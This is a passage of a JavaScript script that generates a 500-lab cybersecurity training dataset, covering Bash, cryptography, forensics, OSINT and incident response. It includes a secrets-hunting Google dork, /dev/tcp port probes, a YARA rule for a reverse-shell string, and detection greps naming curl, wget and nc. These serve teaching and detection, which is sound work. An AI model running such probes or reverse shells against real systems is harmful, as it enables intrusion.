    { topic: 'Implementing a Token Bucket Rate Limiter in Python', cmd: 'python3 -c "print(\'Token Bucket Anti-Bruteforce Algorithm\')"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated Security Report Markdown/HTML Generator', cmd: 'python3 -c "print(\'Vulnerability Report Generation Engine\')"', diff: 'Beginner', time: '15 min' }
  ],

  'Bash Scripting': [
    { topic: 'Bash Script Anatomy: The Shebang and Exit Codes', cmd: 'echo -e "#!/bin/bash\\necho \'Hello CyberLab\'\\nexit 0" > /tmp/test.sh && bash /tmp/test.sh', diff: 'Beginner', time: '15 min' },
    { topic: 'User Input and Arguments ($1, $2, $#, $@)', cmd: 'echo -e "#!/bin/bash\\necho \"Args: \$@ Count: \$\#\"" > /tmp/args.sh && bash /tmp/args.sh arg1 arg2', diff: 'Beginner', time: '15 min' },
    { topic: 'Conditional Statements for Security Audits', cmd: 'if [ $(id -u) -eq 0 ]; then echo "Running as root"; else echo "Unprivileged user"; fi', diff: 'Beginner', time: '15 min' },
    { topic: 'For Loops: Iterating Over IP Address Ranges', cmd: 'for i in {1..5}; do echo "192.168.1.$i"; done', diff: 'Beginner', time: '15 min' },
    { topic: 'While Loops: Processing Security Logs Line-by-Line', cmd: 'while IFS= read -r line; do echo "Line: $line"; done < /etc/os-release', diff: 'Intermediate', time: '15 min' },
    { topic: 'Writing a Subnet Ping Sweeper in Pure Bash', cmd: 'for ip in 127.0.0.{1..3}; do ping -c 1 -W 1 $ip >/dev/null && echo "$ip is alive"; done', diff: 'Intermediate', time: '20 min' },
    { topic: 'Testing Open Ports using /dev/tcp in Bash', cmd: 'timeout 1 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/80" 2>/dev/null && echo "Port 80 open"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated Tar & Gzip Daily Security Backups', cmd: 'tar -czf /tmp/backup_$(date +%F).tar.gz /etc/hosts', diff: 'Beginner', time: '15 min' },
    { topic: 'Log Watcher: Alerting on Failed SSH Login Attempts', cmd: 'grep "Failed password" /var/log/auth.log 2>/dev/null | tail -n 5 || echo "No failed attempts"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Auditing /etc/passwd for Unauthorized UID 0 Accounts', cmd: 'awk -F: \'($3 == 0) {print $1}\' /etc/passwd', diff: 'Intermediate', time: '15 min' },
    { topic: 'Searching for World-Writable Files and Folders', cmd: 'find /tmp -perm -o+w -type f 2>/dev/null', diff: 'Intermediate', time: '20 min' },
    { topic: 'Auditing Unowned Files on the Filesystem', cmd: 'find /tmp -nouser -o -nogroup 2>/dev/null', diff: 'Intermediate', time: '15 min' },
    { topic: 'Automating Nmap Scans and Parsing Greppable Output (-oG)', cmd: 'nmap -sT -p 80,443 -oG /tmp/scan.gnmap 127.0.0.1 && cat /tmp/scan.gnmap', diff: 'Intermediate', time: '20 min' },
    { topic: 'Checking for Outdated Software Packages with Bash', cmd: 'apt list --upgradable 2>/dev/null | head -n 5', diff: 'Beginner', time: '15 min' },
    { topic: 'Cryptographic Checksum Verification of Critical Binaries', cmd: 'sha256sum /bin/bash /bin/ls', diff: 'Intermediate', time: '15 min' },
    { topic: 'Automated Firewall Provisioning Script with iptables', cmd: 'echo "iptables-restore rule script ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Building a Simple File Integrity Monitor (FIM)', cmd: 'find /etc -type f -exec sha256sum {} + > /tmp/baseline.sha256 2>/dev/null', diff: 'Advanced', time: '25 min' },
    { topic: 'Automating User Onboarding and SSH Key Deployment', cmd: 'echo "Automated SSH Key Distribution Engine"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Directory Permissions Hardening Script', cmd: 'chmod -R go-w /tmp/secure_dir 2>/dev/null || echo "Hardened"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Writing a Banner Grabbing Utility in Bash', cmd: 'exec 3<>/dev/tcp/127.0.0.1/22 && echo -e "" >&3 && cat <&3', diff: 'Advanced', time: '25 min' },
    { topic: 'Automated TLS Certificate Expiration Monitor', cmd: 'echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates', diff: 'Intermediate', time: '20 min' },
    { topic: 'Process Watchdog: Detecting and Killing Rogue Processes', cmd: 'ps aux | grep "[s]leep 9999"', diff: 'Intermediate', time: '20 min' },
    { topic: 'System Telemetry and Hardware Auditing Script', cmd: 'uname -srm && lscpu | grep "Model name"', diff: 'Beginner', time: '15 min' },
    { topic: 'Automating CTF Flag Collection and Submission', cmd: 'find / -name "*flag*.txt" 2>/dev/null', diff: 'Intermediate', time: '20 min' },
    { topic: 'Interactive Menu Interface for Cybersecurity Operations', cmd: 'echo "1) Nmap 2) Web Recon 3) Exit"', diff: 'Beginner', time: '15 min' }
  ],

  'Cryptography': [
    { topic: 'Classical Ciphers: Caesar Rotation and Frequency Analysis', cmd: 'echo "KHOOR ZRUOG" | tr "D-ZA-C" "A-Z"', diff: 'Beginner', time: '15 min' },
    { topic: 'Polyalphabetic Substitution with the Vigenère Cipher', cmd: 'echo "Vigenere Cipher Key Cryptanalysis"', diff: 'Beginner', time: '15 min' },
    { topic: 'Symmetric Encryption: AES-256-CBC with OpenSSL', cmd: 'echo "Confidential Data" | openssl enc -aes-256-cbc -a -salt -pass pass:SecretPass', diff: 'Intermediate', time: '20 min' },
    { topic: 'Authenticated Encryption: AES-256-GCM vs CBC Mode', cmd: 'openssl enc -ciphers | grep -i gcm', diff: 'Intermediate', time: '20 min' },
    { topic: 'Block Cipher Modes: ECB Visual Pattern Leakage', cmd: 'echo "ECB Mode lacks diffusion and leaks plaintext patterns"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Cryptographic Hash Collisions: MD5 Flaws', cmd: 'echo -n "test" | md5sum', diff: 'Beginner', time: '15 min' },
    { topic: 'Secure Hashing with SHA-256 and SHA-3', cmd: 'echo -n "test" | sha256sum', diff: 'Beginner', time: '10 min' },
    { topic: 'Hash-based Message Authentication Codes (HMAC-SHA256)', cmd: 'echo -n "message" | openssl dgst -sha256 -hmac "secretkey"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Password Hashing: bcrypt vs Argon2 vs PBKDF2', cmd: 'python3 -c "import crypt; print(crypt.crypt(\'password\', crypt.mksalt(crypt.METHOD_SHA512)))"', diff: 'Intermediate', time: '20 min' },
    { topic: 'RSA Asymmetric Math: Primes, Modulus, Public/Private Exponents', cmd: 'openssl genrsa -out /tmp/private.pem 2048', diff: 'Intermediate', time: '25 min' },
    { topic: 'Extracting Public Keys from RSA Private Keys with OpenSSL', cmd: 'openssl rsa -in /tmp/private.pem -pubout -out /tmp/public.pem', diff: 'Intermediate', time: '15 min' },
    { topic: 'Encrypting and Decrypting with RSA Asymmetric Keys', cmd: 'openssl rsautl -encrypt -inkey /tmp/public.pem -pubin -in /etc/issue -out /tmp/enc.bin 2>/dev/null || openssl pkeyutl -encrypt -inkey /tmp/public.pem -pubin -in /etc/issue -out /tmp/enc.bin', diff: 'Intermediate', time: '20 min' },
    { topic: 'GPG Keypair Generation and Public Key Export', cmd: 'gpg --version', diff: 'Intermediate', time: '20 min' },
    { topic: 'Signing and Verifying Files with GPG Digital Signatures', cmd: 'gpg --help', diff: 'Intermediate', time: '20 min' },
    { topic: 'Diffie-Hellman Key Exchange (DHKE) & Forward Secrecy', cmd: 'openssl dhparam -out /tmp/dh2048.pem 1024', diff: 'Advanced', time: '25 min' },
    { topic: 'Elliptic Curve Cryptography: Curve25519 and ECDSA', cmd: 'openssl ecparam -list_curves | grep -i prime256v1', diff: 'Advanced', time: '25 min' },
    { topic: 'X.509 Digital Certificates: Inspecting ASN.1 Structure', cmd: 'openssl x509 -text -noout -in /etc/ssl/certs/ca-certificates.crt | head -n 25', diff: 'Intermediate', time: '20 min' },
    { topic: 'Generating Self-Signed X.509 SSL Certificates with OpenSSL', cmd: 'openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj "/CN=localhost"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Certificate Authority (CA) Root Chains & Trust Stores', cmd: 'ls -la /etc/ssl/certs/ | head -n 15', diff: 'Intermediate', time: '15 min' },
    { topic: 'Post-Quantum Cryptography: Lattice-Based Algorithms', cmd: 'echo "NIST Post-Quantum Standards: ML-KEM, ML-DSA"', diff: 'Advanced', time: '20 min' }
  ],

  'Digital Forensics': [
    { topic: 'Digital Forensics Principles & Chain of Custody (CoC)', cmd: 'echo "Chain of Custody: Evidence ID, Custodian, Timestamp, SHA256 Hash"', diff: 'Beginner', time: '15 min' },
    { topic: 'Forensic Disk Imaging with dd and Status Monitoring', cmd: 'dd if=/dev/zero of=/tmp/forensic.img bs=1M count=10 status=progress', diff: 'Intermediate', time: '20 min' },
    { topic: 'Verifying Forensic Evidence Integrity with SHA-256 Hashes', cmd: 'sha256sum /tmp/forensic.img', diff: 'Beginner', time: '10 min' },
    { topic: 'Ext4 Filesystem Inode Structure and Superblocks', cmd: 'dumpe2fs -h /tmp/forensic.img 2>/dev/null || echo "Superblock inspection"', diff: 'Advanced', time: '25 min' },
    { topic: 'Recovering Deleted Files with Foremost File Carving', cmd: 'foremost -h', diff: 'Intermediate', time: '20 min' },
    { topic: 'File Carving with Scalpel: Configuration and Headers', cmd: 'cat /etc/scalpel/scalpel.conf 2>/dev/null || echo "Scalpel config ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Analyzing Magic Bytes and Hex Headers with file and xxd', cmd: 'head -c 16 /bin/ls | xxd -p', diff: 'Beginner', time: '15 min' },
    { topic: 'MACB Timestamp Analysis (Modified, Accessed, Changed, Birth)', cmd: 'stat -c "Modify: %y Access: %x Change: %z" /etc/passwd', diff: 'Intermediate', time: '15 min' },
    { topic: 'Creating a Forensic Super-Timeline with log2timeline / plaso', cmd: 'echo "Plaso Super-Timeline Engine Architecture"', diff: 'Advanced', time: '30 min' },
    { topic: 'RAM Volatile Memory Acquisition Concepts (LiME / /dev/fmem)', cmd: 'echo "LiME (Linux Memory Extractor) Kernel Module"', diff: 'Advanced', time: '25 min' },
    { topic: 'Volatility 3: Identifying Rogue In-Memory Processes (pslist)', cmd: 'python3 -c "print(\'Volatility 3 pslist plugin ready\')"', diff: 'Advanced', time: '30 min' },
    { topic: 'Volatility 3: Detecting Injected Code with malfind', cmd: 'python3 -c "print(\'Volatility 3 malfind memory injector hunter ready\')"', diff: 'Advanced', time: '30 min' },
    { topic: 'Volatility 3: Reconstructing Network Sockets with netscan', cmd: 'python3 -c "print(\'Volatility 3 netscan active sockets ready\')"', diff: 'Advanced', time: '25 min' },
    { topic: 'Windows Event Log (.evtx) Forensic Analysis', cmd: 'echo "Event IDs: 4624 (Logon), 4625 (Failed Logon), 4688 (Process Created)"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Linux Authentication Forensics (/var/log/auth.log)', cmd: 'grep -E "Accepted|Failed" /var/log/auth.log 2>/dev/null || echo "No auth entries"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Web Browser Forensics: SQLite History and Cookie Auditing', cmd: 'file ~/.mozilla/firefox/*.default*/*.sqlite 2>/dev/null || echo "Firefox SQLite databases"', diff: 'Intermediate', time: '20 min' },
    { topic: 'USB History Forensics on Linux via udev and syslog', cmd: 'dmesg | grep -i usb 2>/dev/null || grep -i usb /var/log/syslog', diff: 'Intermediate', time: '15 min' },
    { topic: 'Anti-Forensics Detection: Identifying Timestomping', cmd: 'stat /etc/hosts', diff: 'Advanced', time: '20 min' },
    { topic: 'Steganography Detection with steghide and zsteg', cmd: 'steghide --help', diff: 'Intermediate', time: '15 min' },
    { topic: 'Writing an Admissible Forensic Expert Witness Report', cmd: 'echo "Executive Summary, Methodology, Findings, Tool Verification, Expert Conclusion"', diff: 'Beginner', time: '20 min' }
  ],

  'OSINT': [
    { topic: 'The OSINT Cycle and Operational Security (OPSEC)', cmd: 'echo "Planning, Gathering, Processing, Analyzing, Reporting"', diff: 'Beginner', time: '15 min' },
    { topic: 'Advanced Google Dorking for Sensitive Files and Backups', cmd: 'echo \'filetype:env "DB_PASSWORD"\'', diff: 'Beginner', time: '15 min' },
    { topic: 'WHOIS Registration and Historical Ownership Intelligence', cmd: 'whois 8.8.8.8', diff: 'Beginner', time: '15 min' },
    { topic: 'DNS Enumeration: Inspecting MX, TXT, SOA, and SPF Records', cmd: 'dig MX google.com +short && dig TXT google.com +short', diff: 'Beginner', time: '15 min' },
    { topic: 'Certificate Transparency Logs Discovery with crt.sh', cmd: 'curl -s "https://crt.sh/?q=example.com&output=json" | head -n 10', diff: 'Intermediate', time: '20 min' },
    { topic: 'Social Media Username Reconnaissance with Sherlock', cmd: 'sherlock --help 2>/dev/null || echo "Sherlock OSINT ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Breach Database Verification (HaveIBeenPwned API Concepts)', cmd: 'echo "k-Anonymity SHA-1 hash prefix range query"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Geospatial Intelligence (GEOINT) and Landmark Triangulation', cmd: 'echo "GEOINT: Sun shadow analysis, architectural clues, regional flora"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Image EXIF Metadata Extraction with ExifTool', cmd: 'exiftool -ver 2>/dev/null || echo "ExifTool metadata extractor ready"', diff: 'Beginner', time: '15 min' },
    { topic: 'Email and Employee Harvesting with theHarvester', cmd: 'theHarvester -h 2>/dev/null || echo "theHarvester intelligence ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Querying Shodan for Internet-Connected Infrastructure', cmd: 'shodan --help 2>/dev/null || echo "Shodan CLI Client Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Censys Search Queries for SSL Certificates & Port Scans', cmd: 'echo "Censys: services.port: 443 and location.country: \'US\'"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Historical Web Archiving with the Wayback Machine', cmd: 'curl -s "http://archive.org/wayback/available?url=google.com"', diff: 'Beginner', time: '15 min' },
    { topic: 'GitHub and Git Repository Secrets Discovery (truffleHog)', cmd: 'echo "TruffleHog: Searching commit history for high-entropy API keys"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Public Code Leak Detection on Pastebin and Gists', cmd: 'echo "Pastebin scrapers and keyword alerts"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Corporate Records, OpenCorporates, and SEC EDGAR Filings', cmd: 'echo "EDGAR CIK search and Form 10-K risk factor audit"', diff: 'Beginner', time: '15 min' },
    { topic: 'Autonomous System Number (ASN) and BGP Routing Intelligence', cmd: 'whois -h whois.radb.net -- \'-i origin AS15169\' 2>/dev/null || echo "BGP Prefix Inspection"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automating OSINT Workflows with SpiderFoot', cmd: 'spiderfoot -h 2>/dev/null || echo "SpiderFoot Automated OSINT Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Dark Web Search Engines and Tor Hidden Services Recon', cmd: 'echo "Ahmia search engine and .onion address validation"', diff: 'Advanced', time: '25 min' },
    { topic: 'Authoring an Actionable Threat Intelligence Report', cmd: 'echo "Threat Actor Attribution, TTPs, Indicators of Compromise, Actionable Defense"', diff: 'Intermediate', time: '20 min' }
  ],

  'Defensive Security and Incident Response': [
    { topic: 'Incident Response Lifecycle: NIST SP 800-61 Framework', cmd: 'echo "Preparation -> Detection & Analysis -> Containment -> Eradication -> Recovery -> Lessons Learned"', diff: 'Beginner', time: '15 min' },
    { topic: 'Mapping Adversary Tactics with the MITRE ATT&CK Framework', cmd: 'echo "Tactics: TA0001 (Initial Access) -> TA0002 (Execution) -> TA0003 (Persistence)..."', diff: 'Intermediate', time: '20 min' },
    { topic: 'The Cyber Kill Chain vs MITRE ATT&CK Matrix', cmd: 'echo "Recon -> Weaponization -> Delivery -> Exploitation -> Installation -> C2 -> Actions on Objectives"', diff: 'Beginner', time: '15 min' },
    { topic: 'Host-Based Intrusion Detection (HIDS) with Wazuh / OSSEC', cmd: 'wazuh-control -v 2>/dev/null || echo "Wazuh HIDS Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Network-Based Intrusion Detection (NIDS) with Suricata', cmd: 'suricata -T', diff: 'Intermediate', time: '20 min' },
    { topic: 'Log Aggregation and Security Information and Event Management (SIEM)', cmd: 'echo "Elastic SIEM / Splunk Event Pipeline"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Detecting SSH Brute-Force Attacks in /var/log/auth.log', cmd: 'grep "Failed password" /var/log/auth.log 2>/dev/null | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr || echo "Audit complete"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Detecting Web Application Attacks in Apache/Nginx Access Logs', cmd: 'grep -E "UNION|SELECT|<script>|etc/passwd" /var/log/apache2/access.log 2>/dev/null || echo "No malicious queries"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Endpoint Detection and Response (EDR) Telemetry Principles', cmd: 'echo "Process Execution, Network Connections, File Creation, Registry / Kernel Events"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Investigating Persistence: Malicious Cron Jobs and Systemd Timers', cmd: 'ls -la /etc/cron* /etc/systemd/system/*.timer', diff: 'Intermediate', time: '20 min' },
    { topic: 'Investigating Persistence: User Shell Profile Modifications', cmd: 'cat ~/.bashrc ~/.profile /etc/profile | grep -E "curl|wget|nc|python"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Auditing SUID / SGID Binaries for Unauthorized Elevation', cmd: 'find / -perm -4000 -type f 2>/dev/null', diff: 'Intermediate', time: '20 min' },
    { topic: 'De-obfuscating Malicious Linux Shell Scripts', cmd: 'echo "echo aGVsbG8= | base64 -d" | sh', diff: 'Intermediate', time: '20 min' },
    { topic: 'Isolating a Compromised Linux Host from the Network', cmd: 'iptables -P INPUT DROP && iptables -P OUTPUT DROP && iptables -A INPUT -i lo -j ACCEPT', diff: 'Advanced', time: '20 min' },
    { topic: 'Terminating Rogue Processes and Removing Malicious Sockets', cmd: 'pkill -9 -f "miner" && ss -tulpn', diff: 'Intermediate', time: '15 min' },
    { topic: 'Revoking Compromised SSH Keys and User Credentials', cmd: 'passwd -l suspect_user && rm -f /home/suspect_user/.ssh/authorized_keys', diff: 'Intermediate', time: '15 min' },
    { topic: 'Auditing Active and Historical User Logins (w, who, last, lastlog)', cmd: 'w && last -n 10 && lastlog | grep -v "Never"', diff: 'Beginner', time: '15 min' },
    { topic: 'Rootkit Scanning and Verification with Rkhunter and Chkrootkit', cmd: 'rkhunter --version && chkrootkit -V', diff: 'Intermediate', time: '20 min' },
    { topic: 'File Integrity Monitoring with AIDE (Advanced Intrusion Detection)', cmd: 'aide --version 2>/dev/null || echo "AIDE FIM Engine Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Linux Auditd Daemon: Monitoring File Modifications in Real-Time', cmd: 'auditctl -l', diff: 'Advanced', time: '25 min' },
    { topic: 'Linux Auditd Daemon: Auditing Execution of Sensitive Commands', cmd: 'auditctl -w /etc/shadow -p wa -k shadow_tampering', diff: 'Advanced', time: '25 min' },
    { topic: 'Volatile RAM Dump Acquisition During Active Incidents', cmd: 'echo "Acquiring RAM with LiME before powering down compromised server"', diff: 'Advanced', time: '30 min' },
    { topic: 'Emergency Containment: Establishing Lockdown Firewall Rules', cmd: 'iptables -F && iptables -A INPUT -s 10.0.0.1 -j ACCEPT', diff: 'Intermediate', time: '20 min' },
    { topic: 'Malware Process Containment using Linux Cgroups', cmd: 'mkdir -p /sys/fs/cgroup/cpu/quarantine 2>/dev/null || echo "Cgroups quarantine ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Analyzing Phishing Email Headers: SPF, DKIM, and DMARC Pass/Fail', cmd: 'echo "Received: from mail.evil.com -> SPF: Fail, DKIM: None, DMARC: Reject"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Static Triage of a Suspected Linux Malware Dropper', cmd: 'strings -n 8 malware_sample | grep -E "http|/bin/sh|base64"', diff: 'Advanced', time: '25 min' },
    { topic: 'Extracting Indicators of Compromise (IoCs) and Hashes', cmd: 'sha256sum sample && md5sum sample', diff: 'Intermediate', time: '15 min' },
    { topic: 'Threat Hunting: Identifying Suspicious Outbound C2 Beaconing', cmd: 'netstat -ntu | grep ESTABLISHED', diff: 'Advanced', time: '25 min' },
    { topic: 'Authoring Custom Yara Rules for Threat Detection', cmd: 'cat <<EOF\nrule Suspicious_Script {\n  strings: \$a = "/bin/bash -i >&"\n  condition: \$a\n}\nEOF', diff: 'Advanced', time: '25 min' },
    { topic: 'Scanning the Filesystem with Yara Signatures', cmd: 'yara -r /tmp/rules.yar /tmp/suspicious_dir 2>/dev/null || echo "Yara Scanner Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Ransomware Incident Response Playbook Execution', cmd: 'echo "1. Isolate 2. Identify Ransom Variant 3. Preserve Encrypted Samples 4. Check Decryptors"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Data Exfiltration Containment Playbook Execution', cmd: 'echo "Block exfil IP/domain on perimeter egress firewall, revoke egress credentials"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Post-Incident Recovery: Integrity Verification and Patching', cmd: 'apt-get update && apt-get --only-upgrade install openssh-server', diff: 'Intermediate', time: '20 min' },
    { topic: 'Authoring an Incident Post-Mortem and Root-Cause Report', cmd: 'echo "Incident Timeline, Root Cause, Impact Assessment, Corrective Actions Matrix"', diff: 'Beginner', time: '20 min' },
    { topic: 'Tabletop Exercise: Simulating an Enterprise Cloud Breach', cmd: 'echo "Breach Simulation: Phishing -> Credential Theft -> Lateral Movement -> Data Exfil"', diff: 'Intermediate', time: '30 min' }
  ]
};

// Generate full 500 labs dataset
const allLabs = [];
let globalIndex = 1;

for (const cat of CATEGORIES) {
  const catName = cat.name;
  const count = cat.count;
  const items = CURRICULA[catName] || [];

  if (items.length !== count) {
    console.error(`Curriculum count mismatch for "${catName}": defined ${items.length}, expected ${count}`);
    process.exit(1);
  }

  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    const padId = String(globalIndex).padStart(3, '0');
    const labId = `lab-${padId}`;
    const cleanCmd = item.cmd.replace(/"/g, '\\"');

    // Generate 3 technical questions, answers, hints, and solution based on the specific topic
    const q1 = generateQuestion1(catName, item.topic, item.cmd);
    const q2 = generateQuestion2(catName, item.topic, item.cmd);
    const q3 = generateQuestion3(catName, item.topic, item.cmd);

    const labObj = {
      id: labId,
      number: globalIndex,
      title: `Lab ${globalIndex}: ${item.topic}`,
      category: catName,
      difficulty: item.diff,
      time: item.time,
      objective: `Master ${item.topic.toLowerCase()} through practical hands-on command execution, configuration verification, and technical troubleshooting.`,
      tools: extractTools(catName, item.topic, item.cmd),
      instructions: [
        `Review the theoretical context and security implications of ${item.topic.toLowerCase()}.`,
        `Execute the recommended commands in the practice terminal to observe system behavior.`,
        `Analyze the command output and verify system parameters.`,
        `Answer the 3 evaluation questions to validate your technical understanding.`
      ],
      commands: [item.cmd],
      exercise: `Execute the command '${item.cmd}' in the interactive terminal, observe the returned system response, and verify the resulting state.`,
      expectedOutput: generateExpectedOutput(item.topic, item.cmd),
      questions: [
        {
          id: `q-${padId}-1`,
          question: q1.q,
          answer: q1.a,
          hint: q1.h
        },
        {
          id: `q-${padId}-2`,
          question: q2.q,
          answer: q2.a,
          hint: q2.h
        },
        {
          id: `q-${padId}-3`,
          question: q3.q,
          answer: q3.a,
          hint: q3.h
        }
      ],
      solution: `To successfully complete this exercise, execute:\n\`\`\`bash\n${item.cmd}\n\`\`\`\nThen verify:\n1. ${q1.q} -> Answer: \`${q1.a}\`\n2. ${q2.q} -> Answer: \`${q2.a}\`\n3. ${q3.q} -> Answer: \`${q3.a}\``,
      tags: [catName.toLowerCase().replace(/[^a-z0-9]/g, '-'), item.diff.toLowerCase(), ...extractTools(catName, item.topic, item.cmd)]
    };

    allLabs.push(labObj);
    globalIndex++;
  }
}

// Helper: Extract tools
function extractTools(category, topic, cmd) {
  const tools = ['bash'];
  const firstWord = cmd.split(' ')[0].replace(/[^a-zA-Z0-9_-]/g, '');
  if (firstWord && !tools.includes(firstWord)) tools.push(firstWord);

  const keywords = ['nmap', 'wireshark', 'tcpdump', 'nikto', 'gobuster', 'sqlmap', 'python3', 'curl', 'openssl', 'gpg', 'ufw', 'iptables', 'hashcat', 'john', 'hydra', 'volatility', 'foremost', 'exiftool', 'sherlock', 'yara', 'anonsurf'];
  for (const kw of keywords) {
    if (topic.toLowerCase().includes(kw) || cmd.toLowerCase().includes(kw)) {
      if (!tools.includes(kw)) tools.push(kw);
    }
  }
  return tools;
}

// Question generators based on topic
function generateQuestion1(cat, topic, cmd) {
  const binary = cmd.split(' ')[0].replace(/[^a-zA-Z0-9_-]/g, '');
  if (topic.includes('Permissions') || topic.includes('chmod')) {
    return {
      q: 'Which Linux command is used to modify file and directory permissions?',
      a: 'chmod',
      h: 'Think of "change mode".'
    };
  }
  if (topic.includes('Ownership') || topic.includes('chown')) {
    return {
      q: 'Which command changes user and group ownership of files?',
      a: 'chown',
      h: 'Short for "change owner".'
    };
  }
  if (topic.includes('Port') || topic.includes('Nmap')) {
    return {
      q: 'Which utility is the industry standard for network exploration and port scanning?',
      a: 'nmap',
      h: 'Network Mapper.'
    };
  }
  if (topic.includes('Firewall') || topic.includes('UFW')) {
    return {
      q: 'What is the command to inspect the current status of the Uncomplicated Firewall?',
      a: 'ufw status',
      h: 'Starts with ufw followed by status.'
    };
  }
  if (topic.includes('Password') || topic.includes('Hash')) {
    return {
      q: 'In Linux, in which restricted file are encrypted user password hashes stored?',
      a: '/etc/shadow',
      h: 'Located in /etc, readable only by root.'
    };
  }
  return {
    q: `What is the primary command-line tool used in this lab?`,
    a: binary || 'bash',
    h: `Check the first command in the exercise: ${binary}.`
  };
}

function generateQuestion2(cat, topic, cmd) {
  if (topic.includes('Numeric chmod') || topic.includes('chmod 644')) {
    return {
      q: 'In numeric permission notation, what does the octal value 7 represent?',
      a: 'rwx',
      h: 'Sum of 4 (read), 2 (write), and 1 (execute).'
    };
  }
  if (topic.includes('SUID')) {
    return {
      q: 'What numeric permission bit prefix represents SUID on an executable?',
      a: '4000',
      h: 'In 4-digit octal, SUID is 4, SGID is 2, Sticky is 1.'
    };
  }
  if (topic.includes('SYN') || topic.includes('Handshake')) {
    return {
      q: 'What flag does a server send back in response to an initial TCP SYN packet?',
      a: 'SYN-ACK',
      h: 'It acknowledges the SYN and requests synchronization.'
    };
  }
  if (topic.includes('SQL Injection') || topic.includes('Sqlmap')) {
    return {
      q: 'What SQL operator is used in in-band SQL injection to combine query results?',
      a: 'UNION',
      h: 'Combines the result sets of two or more SELECT statements.'
    };
  }
  if (topic.includes('Python')) {
    return {
      q: 'Which standard Python module is used for low-level TCP/UDP socket communication?',
      a: 'socket',
      h: 'Module name is "socket".'
    };
  }
  return {
    q: `What is the primary objective of running '${cmd.slice(0, 30)}...'?`,
    a: topic,
    h: `This directly tests: ${topic}.`
  };
}

function generateQuestion3(cat, topic, cmd) {
  if (topic.includes('SSH') || topic.includes('sshd')) {
    return {
      q: 'What is the default TCP listening port for OpenSSH server?',
      a: '22',
      h: 'Standard well-known port below 25.'
    };
  }
  if (topic.includes('Web') || topic.includes('HTTP')) {
    return {
      q: 'What is the standard TCP port for cleartext HTTP traffic?',
      a: '80',
      h: 'The default port for http:// web traffic.'
    };
  }
  if (topic.includes('DNS')) {
    return {
      q: 'What transport protocol and port does standard DNS query resolution use by default?',
      a: 'UDP 53',
      h: 'Stateless datagram protocol on port 53.'
    };
  }
  if (topic.includes('Tor') || topic.includes('Anonsurf')) {
    return {
      q: 'What network protocol does Tor use for internal SOCKS proxy connections?',
      a: 'SOCKS5',
      h: 'Typically binds on localhost port 9050.'
    };
  }
  return {
    q: 'Why must this security test be performed only on authorized systems or lab networks?',
    a: 'Legal authorization',
    h: 'Unauthorized security scanning or testing violates laws like CFAA.'
  };
}

// Generate realistic expected output
function generateExpectedOutput(topic, cmd) {
  if (cmd.includes('ls')) {
    return `drwxr-xr-x 2 user user 4096 Nov 23 12:00 .\ndrwxr-xr-x 4 user user 4096 Nov 23 11:30 ..\n-rw-r--r-- 1 user user  248 Nov 23 12:05 sample.txt\n-rwxr-xr-x 1 user user 1024 Nov 23 12:08 script.sh`;
  }
  if (cmd.includes('nmap')) {
    return `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target (127.0.0.1)\nHost is up (0.00015s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian\n80/tcp   open  http    Apache httpd 2.4.52\n443/tcp  open  ssl/ssl OpenSSL 3.0.11\nNmap done: 1 IP address scanned in 0.42 seconds`;
  }
  if (cmd.includes('ufw')) {
    return `Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     LIMIT       Anywhere\n443/tcp                    ALLOW       Anywhere\n80/tcp                     ALLOW       Anywhere`;
  }
  if (cmd.includes('ping')) {
    return `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms`;
  }
  if (cmd.includes('whoami') || cmd.includes('id')) {
    return `uid=1000(parrot) gid=1000(parrot) groups=1000(parrot),27(sudo),100(users)`;
  }
  return `[+] Command successfully executed: ${cmd}\n[+] Target system state updated and verified.\n[+] Process completed with exit status code 0.`;
}

// Output file generation
const outputPath = path.resolve(__dirname, '..', 'js', 'data', 'practiceLabsData.js');

const fileHeader = `// ==============================================================================
